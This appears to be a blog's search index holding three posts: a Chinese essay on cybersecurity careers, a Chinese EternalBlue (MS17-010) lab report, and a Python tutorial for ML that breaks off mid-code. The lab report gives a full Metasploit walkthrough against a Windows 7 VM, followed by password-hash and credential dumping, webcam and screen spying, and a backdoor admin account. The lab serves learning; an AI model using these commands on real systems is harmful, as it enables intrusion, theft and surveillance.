<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网络安全行业调研与个人成长路线规划</title>
      <link href="/2023/08/30/Cyber%20Security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E8%B0%83%E7%A0%94%E4%B8%8E%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF%E8%B7%AF%E7%BA%BF%E8%A7%84%E5%88%92/"/>
      <url>/2023/08/30/Cyber%20Security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E8%B0%83%E7%A0%94%E4%B8%8E%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF%E8%B7%AF%E7%BA%BF%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="网络安全行业调研与个人成长路线规划"><a href="#网络安全行业调研与个人成长路线规划" class="headerlink" title="网络安全行业调研与个人成长路线规划"></a>网络安全行业调研与个人成长路线规划</h1><h2 id="本文思路"><a href="#本文思路" class="headerlink" title="本文思路"></a>本文思路</h2><ul><li>了解网络安全人才需求、技能要求、成长路线，思考个人职业规划和发展</li><li>记录学习的思考过程和收获</li></ul><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><ul><li>本文通过参考近年“人才白皮书”，对我国目前网络安全行业人才需求、技能要求和成长路线做了比较综合的分析。文末，笔者结合个人的认知和上述资料，总结了自己对个人职业规划与发展的思考。</li></ul><h3 id="网络安全人才需求快速增长（人才需求多、缺口大）"><a href="#网络安全人才需求快速增长（人才需求多、缺口大）" class="headerlink" title="网络安全人才需求快速增长（人才需求多、缺口大）"></a>网络安全人才需求快速增长（人才需求多、缺口大）</h3><ul><li>从行业上来说，网络安全人才分布呈现一定的集中效应，IT信息技术行业和互联网成为网络安全人才的需求大户。其中，大型企业大多都有专门设立的网络安全部门，从用人单位规模和性质来说，千人以上规模的大（中）型、民营企业抢占了大部分网络安全人才市场。</li><li>然而，市场需求并未得到充分满足。从《报告》的另一组数据可以看出，从区域的网安人才供需情况来看，以历年企业网络安全岗位数量和每年院校毕业的网安专业的学生总数为基础，网络安全人才市场每年的平均需求与供给之比约为2:1，供需严重不匹配。</li></ul><h3 id="北京、深圳、杭州对网络安全人才最为“求贤若渴”（特定地区需求高，校企合作模式）"><a href="#北京、深圳、杭州对网络安全人才最为“求贤若渴”（特定地区需求高，校企合作模式）" class="headerlink" title="北京、深圳、杭州对网络安全人才最为“求贤若渴”（特定地区需求高，校企合作模式）"></a>北京、深圳、杭州对网络安全人才最为“求贤若渴”（特定地区需求高，校企合作模式）</h3><ul><li>在网络安全人才需求城市排行中，北京、深圳、杭州位列前三，企业对于网安人才的需求在不断扩大。</li><li>网络安全企业在积极通过自身日益完善的人才培养体系，不断通过各种赛事、培训为自身输血。以安恒信息为例，为培养高素质网络安全人才，安恒数字人才创研院打造“4+1+1”演训产品体系，实践校企合作模式、多层次可持续行业人才培养模式，构建网安人才全生命周期人才队伍建设体系。</li></ul><h3 id="网络安全产业发展态势（市场增长快，平均学历高、薪资高，年龄结构年轻化，应届生能力差别大）"><a href="#网络安全产业发展态势（市场增长快，平均学历高、薪资高，年龄结构年轻化，应届生能力差别大）" class="headerlink" title="网络安全产业发展态势（市场增长快，平均学历高、薪资高，年龄结构年轻化，应届生能力差别大）"></a>网络安全产业发展态势（市场增长快，平均学历高、薪资高，年龄结构年轻化，应届生能力差别大）</h3><ul><li>根据2021年IDC预测，未来五年中国将成为网络安全三大一级市场中增速最快的子市场。</li><li>资料显示，超九成网络安全人才的最高学历为本科及研究生以上，2021年网络安全领域的平均招聘薪酬达到22387元/月，这主要是因为用人单位通过社会招聘网站招募的大多数为中高端人才，薪资待遇会高于行业整体的平均工资水平。</li><li>网络安全从业者呈现逐渐年轻化态势。80%以上的网络安全从业人员的年龄段集中于25-40岁之间，其中30-35岁区间为最主要年龄分布群体</li><li>和高薪资对应的是高校人才培养有待提高：高水平应用型人才在各高校的实践能力养成方面存在较大差距，加之在校期间主动参与企业实践的能动性不同，只有约20%的应届毕业生能够快速融入真实业务，达到企业人才需求；约40%的应届毕业生需要1-2个月的实践培训和演练，能够胜任企业实践能力要求；剩余部分则根本没有掌握行业相关实战技能，也就没有能力进入行业工作。</li></ul><h3 id="网络安全人才发展需政府、院校、培训机构、用人单位联动（学科交叉性强，存在政策需求，教育水平仍需提高，需加强校企合作）"><a href="#网络安全人才发展需政府、院校、培训机构、用人单位联动（学科交叉性强，存在政策需求，教育水平仍需提高，需加强校企合作）" class="headerlink" title="网络安全人才发展需政府、院校、培训机构、用人单位联动（学科交叉性强，存在政策需求，教育水平仍需提高，需加强校企合作）"></a>网络安全人才发展需政府、院校、培训机构、用人单位联动（学科交叉性强，存在政策需求，教育水平仍需提高，需加强校企合作）</h3><ul><li>网络安全作为一门涉及计算机科学、网络技术、通信技术、密码技术、信息安全技术、应用数学、数论、信息论等多种学科的综合性新兴学科，知识和技术发展迅速，且具有较强的后伴生性和学科交叉特质，因此，专业人才培养难度大，路径复杂且周期长。</li><li>对于政府和主管部门，建议在系列政策具体落实过程加强可操作性强的实施办法和政策供给。</li><li>对于网安产业研究和人才服务机构，应深化产教融合协同育人，推动开展网络安全产业人才岗位能力要求标准制定，并依此拓展完善网络安全产业人才能力评价体系，并加强高水平国际交流合作，组织开展网络安全创新创业大赛等活动，以产业需求为牵引，培养选拔网络安全专业人才。</li><li>对于用人单位，应该加强校企合作，给在校学生更多接触实际应用场景的机会，积累实际工作经验，借此推动学校教育跟上时代，改善目前教育落后于实际应用的现象。</li></ul><h3 id="网络安全人才培养体系与成长路线"><a href="#网络安全人才培养体系与成长路线" class="headerlink" title="网络安全人才培养体系与成长路线"></a>网络安全人才培养体系与成长路线</h3><ul><li>目前，网络安全人才大致可以分为6个大类，26个专业领域，具体到96个安全任务角色，599条任务，405条知识，619条技能，65条素养。其中6个大类指的是六大岗位方向：安全开发、安全评估、安全应急、安全运维、安全咨询、安全测试。主要需要注意的是根据自己的能力，在6个大类中选择出最能发挥出自己特长的一个作为潜在方向，同时选出自己最期望的方向作为努力方向，不断提高自己的专业知识基础，定期评估自己的能力，对自己的发展潜力做出评估。对于有能力的选手而言，如果自生能按自己所想的方向成长，则应该考虑自己期望的方向就业；而能力有限的选手则应该看清现实，根据自己的能力选择适合的岗位，这样才能更好适应市场对人才的需求。</li><li>就在某方向上的成长而言，我们可以分为三个阶段：基础岗位、专业岗位、专家岗位。越高级的岗位对能力的要求更高，但一切都是循序渐进的。只要能力足够，按照目标岗位需要的能力定点学习，成长的空间是有的。</li></ul><h3 id="总结与职业发展规划思考"><a href="#总结与职业发展规划思考" class="headerlink" title="总结与职业发展规划思考"></a>总结与职业发展规划思考</h3><ul><li>就人才需求来看：就目前网络安全行业形势来看，网络安全市场应该会持续扩大，目前人才的需求、缺口依然很大，而且近五年进一步增大的可能性高，这为网络安全领域应届生就业提供了很大的窗口。但由于网络安全对于从业者学历和能力都有较高的需求，能够快速融入真实业务的人才十分稀缺，大多数应届生进入行业有能力上的困难；此外，网络安全从业者对工作能力要求比较高，从业者呈现逐渐年轻化态势，部分从业者到了一定年龄就难以跟上目前行业的水平，导致实际上减去离开行业的人员之后，行业内实际增加的从业者显得不是很多；这些都导致了网络安全人才的稀缺性。目前网络安全行业目前平均收入高，而且随着市场的扩大、产值的提高，薪资方面会在经过几年的发展后或许能够对人才产生更大的吸引力。</li><li>就技能要求来说：一方面，要具有踏实的专业基础；第二方面，对跨学科综合能力要求比较高，要广泛涉猎多个学科才能更好地实际应用；第三方面，要有较多真实业务经验才能胜任职务；第四方面，对从业者技术先进性要求较高，从业者需要不断学习新的技术，才能适应环境变化快速的网络安全行业；这些因素综合起来就导致网络安全行业对从业者技术要求比较严苛，应届生需要有扎实的专业基础，同时有较多课外的实践经历，积累不同学科综合应用和进行真实业务的经验。</li><li>就成长路线而言：目前网络安全行业已经存在一些现成的成长路线，可以作为参考。根据自身能力和兴趣综合考量，我们可以确认我们岗位的大致方向，进而根据该方向不同级别的岗位所要求的能力循序渐进提升自身能力，实现职业发展成长。对学生而言，重要的是尽早对自我有清晰认识，完成较清晰的职业规划。</li><li>个人对目前的网络安全行业发展前景比较看好，同时也对网络安全人才技能要求感到有些压力。就兴趣而言，个人偏向安全运维方向，因为个人认为运维比较考量的是从业者对企业安全的综合能力，能够更好的构建对整个安全行业的认识，也利于个人在网络安全的多个方向得到锻炼成长；而对于工作强度较高且面对网络攻击略显被动的安全开发岗位和对抗性过高且风险较大的安全应急岗位，笔者并不太中意；就能力考量，个人认为各个方向应该都可以考虑，因为个人自学能力较强，如果在薪资和工作强度能够符合预期的情况下，个人有自信能够在任一方向成长。但综合考量下来，个人认为以：“安全运维工程师，基础设施安全专家，攻击研判分析专家，安全保障专家，安全运维架构师”的方向发展职业最适合自己。</li></ul><h3 id="参考网络资料"><a href="#参考网络资料" class="headerlink" title="参考网络资料"></a>参考网络资料</h3><ul><li>《网络安全产业人才发展报告（2021版）》</li><li>《网络安全产业人才发展报告（2022版）》</li></ul>]]></content>
      
      
      <categories>
          
          <category> Cyber Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝渗透测试报告</title>
      <link href="/2023/08/30/Cyber%20Security/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
      <url>/2023/08/30/Cyber%20Security/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="永恒之蓝实验报告"><a href="#永恒之蓝实验报告" class="headerlink" title="永恒之蓝实验报告"></a>永恒之蓝实验报告</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>实验主题：永恒之蓝渗透测试复现</li><li>实验背景：永恒之蓝是在2017年4月14日晚由黑客团体 Shadow Brokers（影子经纪人）公布的一大批网络攻击工具，其中包含“永恒之蓝”工具。永恒之蓝利用 Windows 系统的 SMB 漏洞可以获取系统最高权限。5月12日，不法分子通过改造永恒之蓝制作了 wannacry 勒索病毒，在全世界多个高校、大型企业和政府机关传播，被勒索支付高额赎金才可以解密恢复文件</li></ul><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul><li>软件：Vmware Workstation pro</li><li>攻击机：kali-linux</li><li>靶机：Windows7</li><li>工具：Metasploit、Nmap</li><li>使用漏洞：MS17-010</li></ul><h2 id="Metasploit-术语"><a href="#Metasploit-术语" class="headerlink" title="Metasploit 术语"></a>Metasploit 术语</h2><ul><li>Exploit（渗透攻击）：指攻击者利用系统、应用或服务的漏洞进行的攻击行为。常见的渗透攻击包括缓冲区溢出、SQL注入、XSS等。</li><li>Payload（攻击载荷）：指我们希望靶机在被攻击后执行的代码，在 Metasploit 框架中可以自由的选择、传送和植入。</li><li>ShellCode：指渗透攻击时作为攻击载荷一部分的一组机器指令，通常用汇编语言编写。</li><li>Module（模块）：Metasploit 框架中所使用的一段软件代码组件。</li><li>Listener（监听器）：用来等待接入网络连接主机的组件。</li></ul><h2 id="关于-MS17-010-漏洞"><a href="#关于-MS17-010-漏洞" class="headerlink" title="关于 MS17-010 漏洞"></a>关于 MS17-010 漏洞</h2><ul><li>漏洞描述：MS17-010是2017年发现的第十项漏洞，是 Microsoft Windows SMB Server 远程代码执行漏洞。Microsoft Server Message Block 1.0（SMBv1）服务器处理某些请求时，在实现上存在远程代码执行漏洞。攻击者成功利用该漏洞后可以在目标服务器上执行任意代码。如果攻击失败，也会导致拒绝服务，对业务造成一定安全风险。</li><li>漏洞环境：<ul><li>Microsoft Windows Server 2016</li><li>Microsoft Windows Server 2012</li><li>Microsoft Windows Server 2012 R2</li><li>Microsoft Windows Server 2008</li><li>Microsoft Windows Server 2008 R2</li><li>Microsoft Windows RT 8.1</li><li>…</li></ul></li></ul><h2 id="实验复现："><a href="#实验复现：" class="headerlink" title="实验复现："></a>实验复现：</h2><h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><ul><li>Kali官方文档：<a href="https://www.kali.org/docs">https://www.kali.org/docs</a></li><li>工具使用：<a href="https://www.kali.org/tools">https://www.kali.org/tools</a></li></ul><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><ul><li>安装Vmware：<a href="https://www.vmware.com/go/getworkstation-win">https://www.vmware.com/go/getworkstation-win</a></li><li>安装Kali：<a href="https://www.kali.org">https://www.kali.org</a></li></ul><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><ul><li>打开 kali 虚拟机，打开 Terminal</li><li>输入 <code>sudo su</code> 并输入密码进入 Root</li><li>输入 <code>ifconfig</code> 查看本机网络状态。此处主要是产看本机 ip，用户后续设置 nmap 查询 和设置 host<br><img src="https://s3.bmp.ovh/imgs/2023/08/28/3704aeea7580f165.png" alt></li><li>输入 <code>nmap -T4 -A -v -Pn &#123;ip&#125;</code>，此处 {ip} 为 ifconfig 查询的本机 ip 将最后一节改为网段格式<br><img src="https://s3.bmp.ovh/imgs/2023/08/28/b8ffdf7e6e46d7b8.png" alt></li><li>查询到目标机的端口和ip后，记录目标ip<br><img src="https://s3.bmp.ovh/imgs/2023/08/28/e86c244445cebdcd.png" alt></li><li>输入 <code>msfconsole</code> 搜索并启动 Metasploit msf 模块<br><img src="https://s3.bmp.ovh/imgs/2023/08/28/6630687b53829531.png" alt></li><li>在 msf 指令框输入 <code>search ms17-010</code> 查询我们需要的漏洞<br><img src="https://s3.bmp.ovh/imgs/2023/08/28/986340a1db400865.png" alt></li><li>在搜索到的条目中，输入 <code>use 0</code> 选择第一条（Payload），进入 Payload 设置</li><li>输入 <code>set lhost &#123;ip&#125;</code>，此处 {ip} 是通过 ifconfig 查询的攻击机 ip</li><li>输入 <code>set rhost &#123;ip&#125;</code>，此处 {ip} 是通过 nmap 扫描出来的靶机 ip</li><li>输入 <code>run</code>，msf 模块会自动对目标机器进行攻击<br><img src="https://s3.bmp.ovh/imgs/2023/08/28/ca81795cccd18576.png" alt></li><li>如果攻击成功，我们会进入 metasploit&gt; 命令行<br><img src="https://s3.bmp.ovh/imgs/2023/08/28/f5e31a2eef7545e3.png" alt></li></ul><h3 id="攻击成功后，攻击者可以对靶机造成的危害"><a href="#攻击成功后，攻击者可以对靶机造成的危害" class="headerlink" title="攻击成功后，攻击者可以对靶机造成的危害"></a>攻击成功后，攻击者可以对靶机造成的危害</h3><ul><li>输入 <code>shell</code> 拿取目标机器Shell，就可以进入目标机器命令行，执行任意操作</li><li>输入 <code>screenshot</code> 截取屏幕快照</li><li>输入 <code>getuid</code> 和 <code>hashdump</code> 获取靶机用户名和MD5加密的密码<br><img src="https://s3.bmp.ovh/imgs/2023/08/28/b08f6049e96bdac4.png" alt></li><li>输入 <code>load kiwi</code> 使用 kiwi 模块，输入 <code>creds_all</code> 获取目标用户和密码信息<br><img src="https://s3.bmp.ovh/imgs/2023/08/29/75c62526548a95c1.png" alt></li><li>输入 <code>upload &#123;origin file path&#125; &#123;target file path&#125;</code> 上传文件到靶机，其中 {origin file path} 指的是文件在攻击机的路径位置，{target file path} 指的是文件在靶机存放的路径位置</li><li>输入 <code>download &#123;target file path&#125; &#123;download file path&#125;</code> 下载文件到本机，其中 {target file path} 指的是文件在靶机的路径位置，{download file path} 是我们要下载到本机的文件路径</li><li>输入 <code>webcam_list</code> 查看摄像头</li><li>输入 <code>webcam_sanp</code> 通过摄像头拍照</li><li>输入 <code>webcam_stream</code> 通过摄像头开启视频</li><li>在 Shell 输入 <code>chcp 65001</code> 修改靶机编码机制<br><img src="https://s3.bmp.ovh/imgs/2023/08/29/768d3b9fd9ca8d85.png" alt></li><li>输入 <code>screenshare</code> 对靶机进行屏幕监控<br><img src="https://s3.bmp.ovh/imgs/2023/08/29/d849e72e2b6e23f0.png" alt></li><li>在 Shell 中使用 <code>net</code> 模块添加用户并设置为管理员<ul><li>通过 <code>net user hacker 123 /add</code> 添加一个名为 hacker 密码为 123 的用户</li><li>通过 <code>net localgroup administrators hacker /add</code> 将 hacker 设置为管理员<br><img src="https://s3.bmp.ovh/imgs/2023/08/29/15f908bf39e9f02b.png" alt></li></ul></li><li>重启靶机，发现用户添加成功<br><img src="https://s3.bmp.ovh/imgs/2023/08/29/bef81e3d0b8a1016.png" alt></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cyber Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tutorial of Python for Learning ML and DL</title>
      <link href="/2023/07/03/Python/Tutorial/"/>
      <url>/2023/07/03/Python/Tutorial/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Tutorial-of-Python-for-Learning-ML-and-DL"><a href="#Tutorial-of-Python-for-Learning-ML-and-DL" class="headerlink" title="Tutorial of Python for Learning ML and DL"></a>Tutorial of Python for Learning ML and DL</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>I’m working on a project on Machine Learning &amp; Deep Learning &amp; Cybersecurity. Since I was not familiar with ML and DL and had no experience with Python in my projects, I found it a little hard to follow those books or online courses right away. Therefore, I decided to gather some tutorial materials so that I could start learning ML and DL without Python constraints. The following is what I have gathered. I wanted to share it to help those who also want to make a crash course in Python and move on to learn ML and DL as soon as possible.</li><li>As a newbie in this field, I can inevitably make some mistakes in this blog. Please let me know if you find any of those. Thanks for your issue! <strong>[My email]:</strong> momoyeyu@outlook.com</li></ul><ul><li>Before diving into machine learning (ML) and deep learning (DL) with Python, it’s beneficial to have a solid understanding of the fundamentals of Python programming. Here are some key areas you should be familiar with:</li></ul><h2 id="1-Syntax-and-Basic-Constructs"><a href="#1-Syntax-and-Basic-Constructs" class="headerlink" title="1. Syntax and Basic Constructs:"></a>1. <strong>Syntax and Basic Constructs</strong>:</h2><ul><li>Familiarize yourself with Python’s syntax, including variables, data types, control flow statements (if-else, loops), functions, and classes. Understand how to write clean and readable code following Python’s style guidelines (PEP 8).<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Variables and basic data types</span></span><br><span class="line">name = <span class="string">&quot;John&quot;</span></span><br><span class="line">age = <span class="number">25</span></span><br><span class="line">is_student = <span class="literal">True</span></span><br><span class="line">height = <span class="number">1.75</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Control flow statements - if-else</span></span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You are an adult.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You are a minor.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loops - for loop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&quot;Alice&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Classes and objects</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">introduce</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;My name is&quot;</span>, self.name, <span class="string">&quot;and I am&quot;</span>, self.age, <span class="string">&quot;years old.&quot;</span>)</span><br><span class="line"></span><br><span class="line">person1 = Person(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>)</span><br><span class="line">person1.introduce()  <span class="comment"># Output: My name is Alice and I am 25 years old.</span></span><br><span class="line"></span><br><span class="line">person2 = Person(<span class="string">&quot;Bob&quot;</span>, <span class="number">30</span>)</span><br><span class="line">person2.introduce()  <span class="comment"># Output: My name is Bob and I am 30 years old.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li>In Python, the <strong>init</strong> method is a special method used as a constructor for initializing objects of a class. It is automatically called when you create a new instance (object) of a class.</li><li>In this example, the Person class has an <strong>init</strong> method that takes two arguments: name and age. Inside the <strong>init</strong> method, these arguments are used to assign values to the instance variables self.name and self.age.</li><li>In this example, self is used to refer to the instance of the Person class. Within the <strong>init</strong> method, self.name assigns the provided name argument to the name attribute of the instance. In the greet method, self.name is used to access the name attribute of the instance.<h2 id="2-Data-Manipulation"><a href="#2-Data-Manipulation" class="headerlink" title="2. Data Manipulation:"></a>2. <strong>Data Manipulation</strong>:</h2></li></ul><ul><li>Learn how to work with Python’s built-in data structures like lists, tuples, dictionaries, and sets. Understand how to perform common operations like indexing, slicing, adding or removing elements, and iterating over collections.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Lists</span></span><br><span class="line">fruits = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(fruits)  <span class="comment"># Output: [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;orange&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accessing elements</span></span><br><span class="line"><span class="built_in">print</span>(fruits[<span class="number">0</span>])  <span class="comment"># Output: apple</span></span><br><span class="line"><span class="built_in">print</span>(fruits[-<span class="number">1</span>])  <span class="comment"># Output: orange</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modifying elements</span></span><br><span class="line">fruits[<span class="number">1</span>] = <span class="string">&#x27;grape&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(fruits)  <span class="comment"># Output: [&#x27;apple&#x27;, &#x27;grape&#x27;, &#x27;orange&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Adding elements</span></span><br><span class="line">fruits.append(<span class="string">&#x27;mango&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(fruits)  <span class="comment"># Output: [&#x27;apple&#x27;, &#x27;grape&#x27;, &#x27;orange&#x27;, &#x27;mango&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Removing elements</span></span><br><span class="line">removed_fruit = fruits.pop(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(removed_fruit)  <span class="comment"># Output: grape</span></span><br><span class="line"><span class="built_in">print</span>(fruits)  <span class="comment"># Output: [&#x27;apple&#x27;, &#x27;orange&#x27;, &#x27;mango&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tuples</span></span><br><span class="line">person = (<span class="string">&#x27;John&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;USA&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(person)  <span class="comment"># Output: (&#x27;John&#x27;, 25, &#x27;USA&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accessing elements</span></span><br><span class="line"><span class="built_in">print</span>(person[<span class="number">0</span>])  <span class="comment"># Output: John</span></span><br><span class="line"><span class="built_in">print</span>(person[<span class="number">1</span>])  <span class="comment"># Output: 25</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unpacking tuple</span></span><br><span class="line">name, age, country = person</span><br><span class="line"><span class="built_in">print</span>(name)  <span class="comment"># Output: John</span></span><br><span class="line"><span class="built_in">print</span>(age)  <span class="comment"># Output: 25</span></span><br><span class="line"><span class="built_in">print</span>(country)  <span class="comment"># Output: USA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dictionaries</span></span><br><span class="line">student = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;major&#x27;</span>: <span class="string">&#x27;Computer Science&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(student)  <span class="comment"># Output: &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 20, &#x27;major&#x27;: &#x27;Computer Science&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accessing values</span></span><br><span class="line"><span class="built_in">print</span>(student[<span class="string">&#x27;name&#x27;</span>])  <span class="comment"># Output: Alice</span></span><br><span class="line"><span class="built_in">print</span>(student.get(<span class="string">&#x27;age&#x27;</span>))  <span class="comment"># Output: 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modifying values</span></span><br><span class="line">student[<span class="string">&#x27;age&#x27;</span>] = <span class="number">21</span></span><br><span class="line"><span class="built_in">print</span>(student)  <span class="comment"># Output: &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 21, &#x27;major&#x27;: &#x27;Computer Science&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Adding new key-value pairs</span></span><br><span class="line">student[<span class="string">&#x27;university&#x27;</span>] = <span class="string">&#x27;ABC University&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(student)  <span class="comment"># Output: &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 21, &#x27;major&#x27;: &#x27;Computer Science&#x27;, &#x27;university&#x27;: &#x27;ABC University&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Removing key-value pairs</span></span><br><span class="line">removed_major = student.pop(<span class="string">&#x27;major&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(removed_major)  <span class="comment"># Output: Computer Science</span></span><br><span class="line"><span class="built_in">print</span>(student)  <span class="comment"># Output: &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 21, &#x27;university&#x27;: &#x27;ABC University&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-Libraries-and-Modules"><a href="#3-Libraries-and-Modules" class="headerlink" title="3. Libraries and Modules:"></a>3. <strong>Libraries and Modules</strong>:</h2></li><li>Explore essential Python libraries commonly used in ML and DL, such as NumPy (for numerical computing), Pandas (for data manipulation and analysis), and Matplotlib (for data visualization). Get comfortable using these libraries to perform common data processing tasks.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 